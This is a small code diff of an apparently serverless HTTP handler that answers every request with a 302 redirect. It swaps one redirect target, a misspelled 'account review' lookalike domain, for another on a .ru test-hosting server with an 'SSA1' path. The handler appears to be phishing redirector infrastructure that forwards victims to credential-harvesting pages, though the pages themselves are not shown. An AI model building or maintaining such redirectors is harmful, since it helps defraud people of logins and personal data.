@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://myacountsrevlewtoday.de/rex/farmers/",
+      Location: "http://srv243430.hoster-test.ru/SSA1/",
     },
   });
 });
